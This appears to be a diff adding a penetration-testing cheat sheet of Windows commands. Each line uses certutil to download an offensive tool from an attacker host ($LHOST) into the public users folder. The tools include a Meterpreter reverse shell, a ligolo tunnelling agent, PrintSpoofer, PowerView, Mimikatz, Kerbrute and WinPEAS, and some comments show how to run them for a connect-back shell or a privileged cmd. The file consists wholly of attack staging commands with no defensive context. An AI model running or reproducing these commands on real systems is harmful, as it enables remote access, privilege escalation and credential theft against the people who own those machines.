@@ -1,0 +1,23 @@
+# msfvenom rev shell 
+certutil.exe -urlcache -f http://$LHOST/met.exe \users\public\mit.exe
+
+# ligolo agent 
+certutil.exe -urlcache -f http://$LHOST/agent/agent.exe \users\public\agent.exe
+# .\agent -connect $LHOST:11601 --ignore-cert
+
+## rotten potato 
+certutil.exe -urlcache -f http://$LHOST/PrintSpoofer64.exe \users\public\prints.exe
+# .\prints -i -c cmd
+
+# powerview
+certutil.exe -urlcache -f http://$LHOST/powerview.ps1 \users\public\powerview.ps1
+# Import-Module powerview.ps1
+
+# Mimikatz
+certutil.exe -urlcache -f http://$LHOST/mimikatz.exe \users\public\mimi.exe
+
+# Kerbrute
+certutil.exe -urlcache -f http://$LHOST/kerbrute_windows_amd64.exe \users\public\ker.exe
+
+# WinPeas
+certutil.exe -urlcache -f http://$LHOST/winpeas64.exe \users\public\winpeas.exe
